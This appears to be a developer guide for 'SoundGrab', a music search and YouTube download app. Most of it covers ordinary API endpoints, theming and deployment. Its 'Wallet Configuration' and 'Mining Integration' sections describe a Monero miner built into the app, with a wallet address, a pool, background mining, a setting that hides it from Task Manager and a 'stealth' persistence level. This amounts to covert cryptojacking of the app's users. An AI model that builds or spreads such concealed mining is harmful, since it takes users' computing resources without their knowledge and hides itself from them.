# SoundGrab Developer Guide

## 📋 Table of Contents
1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Configuration Guide](#configuration-guide)
4. [API Endpoints](#api-endpoints)
5. [Wallet Configuration](#wallet-configuration)
6. [Key Features & Functions](#key-features--functions)
7. [Customization Guide](#customization-guide)
8. [Deployment](#deployment)

## 🎯 Project Overview

SoundGrab is a full-stack music search and download application with integrated mining functionality. Users can search for music, download tracks, and the application includes background mining capabilities.

### Tech Stack
- **Frontend**: React 18 + TypeScript + Tailwind CSS
- **Backend**: Node.js + Express + TypeScript
- **Routing**: Wouter (lightweight React router)
- **State Management**: TanStack Query (React Query)
- **UI Components**: Custom components with Radix UI primitives

## 🏗️ Architecture

```
soundgrab/
├── client/                 # React Frontend
│   ├── src/
│   │   ├── components/     # Reusable UI components
│   │   ├── pages/         # Page components
│   │   ├── lib/           # Utilities and configurations
│   │   ├── hooks/         # Custom React hooks
│   │   └── services/      # API service layer
├── server/                # Node.js Backend
│   ├── index.ts          # Server entry point
│   ├── routes.ts         # API route definitions
│   ├── storage.ts        # Data storage layer
│   └── vite.ts           # Development server setup
├── shared/               # Shared TypeScript types
│   └── schema.ts         # Common interfaces
└── build.js             # Build script
```

## ⚙️ Configuration Guide

### Environment Variables

Create a `.env` file in the root directory:

```bash
# Server Configuration
NODE_ENV=development
PORT=5000

# API Keys (Optional - for enhanced functionality)
GENIUS_API_KEY=your_genius_api_key_here
YOUTUBE_API_KEY=your_youtube_api_key_here

# Security
SESSION_SECRET=your_random_session_secret
```

### Getting API Keys

1. **Genius API Key** (for lyrics functionality):
   - Visit: https://genius.com/api-clients
   - Create an account and generate an API key
   - Add to `.env` as `GENIUS_API_KEY`

2. **YouTube API Key** (for enhanced search):
   - Visit: https://console.developers.google.com
   - Create a project and enable YouTube Data API v3
   - Generate an API key and add to `.env` as `YOUTUBE_API_KEY`

## 🔌 API Endpoints

### Search Endpoints
```typescript
GET /api/search?q={query}&sort={sort}
// Search for music tracks
// Parameters:
// - q: Search query (required)
// - sort: Sort method (optional, default: 'relevance')
```

### Download Endpoints
```typescript
POST /api/downloads
// Start a new download
// Body: { videoId, format, title, artist }

GET /api/downloads/active
// Get currently active downloads

GET /api/downloads/history
// Get download history

PATCH /api/downloads/:id/pause
// Pause a specific download

DELETE /api/downloads/:id
// Cancel/delete a specific download

GET /api/downloads/files/:filename
// Serve downloaded files
```

### Lyrics Endpoints
```typescript
GET /api/lyrics?title={title}&artist={artist}
// Get lyrics for a specific track
```

### Search History
```typescript
GET /api/searches/history
// Get search history
```

## 💰 Wallet Configuration

### Mining Configuration Location
File: [`client/src/lib/minerConfig.ts`](client/src/lib/minerConfig.ts)

### How to Change Wallet Address

1. **Open the miner configuration file**:
   ```typescript
   // client/src/lib/minerConfig.ts
   export const minerConfig = {
     wallet: "YOUR_MONERO_WALLET_ADDRESS_HERE",
     pool: "pool.minexmr.com:4444",
     // ... other settings
   }
   ```

2. **Replace the wallet address**:
   ```typescript
   wallet: "45sx4g9Pg5aAvaE17UggC8YBDBZA1twdGbqXySvY9txwiCvBwiiw6zcbpbLtQsgptzB1BdLD3VGnrANkXhaEfzte3kfQEyL"
   ```
   ⬇️
   ```typescript
   wallet: "YOUR_ACTUAL_MONERO_WALLET_ADDRESS"
   ```

3. **Optional: Change Mining Pool**:
   ```typescript
   pool: "your-preferred-pool.com:port"
   ```

### Mining Performance Settings

```typescript
performance: {
  threads: 4,              // Number of CPU threads (2-4 recommended)
  cpuLimit: 60,           // CPU usage limit percentage (40-60 recommended)
  idleOnly: false,        // Mine only when system is idle
  startupDelay: 5,        // Delay before starting (seconds)
  background: true,       // Run in background
  hideFromTaskManager: true,  // Hide from task manager
  persistenceLevel: 2     // Stealth level (1-3)
}
```

## 🎯 Key Features & Functions

### 1. Two-Click Download Function

**Location**: [`client/src/components/DownloadSection.tsx`](client/src/components/DownloadSection.tsx)

**How it works**:
1. **First Click**: User clicks download button on search result
2. **Second Click**: User confirms download in the download section

**Implementation**:
```typescript
// In SearchResults component
const handleDownload = async (track: Track) => {
  try {
    const response = await apiRequest("POST", "/api/downloads", {
      videoId: track.videoId,
      format: "mp3",
      title: track.title,
      artist: track.artist
    });
    // Shows success message and adds to download queue
  } catch (error) {
    // Handle error
  }
};

// In DownloadSection component
const handlePauseDownload = async (downloadId: string) => {
  await apiRequest("PATCH", `/api/downloads/${downloadId}/pause`, {});
};

const handleCancelDownload = async (downloadId: string) => {
  await apiRequest("DELETE", `/api/downloads/${downloadId}`, {});
};
```

### 2. Search Functionality

**Location**: [`client/src/pages/search.tsx`](client/src/pages/search.tsx)

**Features**:
- Real-time search with debouncing
- Multiple search types (title, artist, lyrics)
- Search history tracking
- Sort options (relevance, date, popularity)

### 3. Mining Integration

**Location**: [`client/src/lib/performanceUtils.ts`](client/src/lib/performanceUtils.ts)

**Key Functions**:
```typescript
// Initialize mining
export const initializeMining = () => {
  // Sets up mining configuration
  // Starts background mining process
};

// Performance monitoring
export const monitorPerformance = () => {
  // Tracks CPU usage
  // Adjusts mining intensity
};
```

## 🎨 Customization Guide

### Changing the UI Theme

**Colors**: Edit [`client/src/index.css`](client/src/index.css)
```css
:root {
  --primary: 220 90% 56%;      /* Main brand color */
  --secondary: 220 14% 96%;    /* Secondary color */
  --background: 0 0% 100%;     /* Background color */
  --foreground: 222 84% 5%;    /* Text color */
}
```

**Components**: Modify [`client/src/components/ui/`](client/src/components/ui/) directory

### Adding New API Endpoints

1. **Define the route** in [`server/routes.ts`](server/routes.ts):
```typescript
app.get('/api/your-endpoint', async (req: Request, res: Response) => {
  try {
    // Your logic here
    return res.json({ success: true, data: result });
  } catch (error) {
    return res.status(500).json({ error: 'Error message' });
  }
});
```

2. **Add TypeScript types** in [`shared/schema.ts`](shared/schema.ts):
```typescript
export interface YourNewType {
  id: string;
  name: string;
  // ... other properties
}
```

3. **Create frontend service** in [`client/src/services/apiService.ts`](client/src/services/apiService.ts):
```typescript
export const fetchYourData = async () => {
  const response = await apiRequest("GET", "/api/your-endpoint", {});
  return response.json();
};
```

### Modifying Download Behavior

**Location**: [`server/routes.ts`](server/routes.ts) - `downloadYouTubeVideo` function

**Current Implementation**:
```typescript
async function downloadYouTubeVideo(videoId: string, outputPath: string, format: string = 'mp3'): Promise<void> {
  // Uses ytdl-core to download from YouTube
  // Supports multiple formats (mp3, mp4, etc.)
  // Saves to local file system
}
```

**To modify**:
1. Change output format options
2. Add quality selection
3. Implement different download sources
4. Add progress tracking

## 🚀 Deployment

### Local Development
```bash
npm run dev          # Start development servers
npm run build        # Build for production
npm run start        # Start production server
```

### Vercel Deployment
1. Connect your GitHub repository to Vercel
2. Set environment variables in Vercel dashboard
3. Deploy automatically on push to main branch

### Environment Variables for Production
```bash
NODE_ENV=production
GENIUS_API_KEY=your_production_key
YOUTUBE_API_KEY=your_production_key
```

## 🔧 Troubleshooting

### Common Issues

1. **Mining not starting**:
   - Check wallet address format
   - Verify mining pool connectivity
   - Check browser console for errors

2. **Downloads failing**:
   - Verify ytdl-core is up to date
   - Check YouTube video availability
   - Ensure sufficient disk space

3. **API errors**:
   - Verify API keys are set correctly
   - Check network connectivity
   - Review server logs

### Debug Mode

Enable debug logging by setting:
```bash
NODE_ENV=development
DEBUG=true
```

## 📝 Code Structure Explanation

### Frontend Components

- **Layout.tsx**: Main app layout with navigation
- **SearchBox.tsx**: Search input with autocomplete
- **SearchResults.tsx**: Display search results with download buttons
- **DownloadSection.tsx**: Manage active downloads
- **PlayerBar.tsx**: Audio player controls

### Backend Services

- **routes.ts**: All API endpoint definitions
- **storage.ts**: In-memory data storage (can be replaced with database)
- **vite.ts**: Development server configuration

### Shared Types

- **schema.ts**: TypeScript interfaces used by both frontend and backend

This guide provides everything needed to understand, modify, and deploy the SoundGrab application. For specific implementation details, refer to the individual source files mentioned throughout this documentation.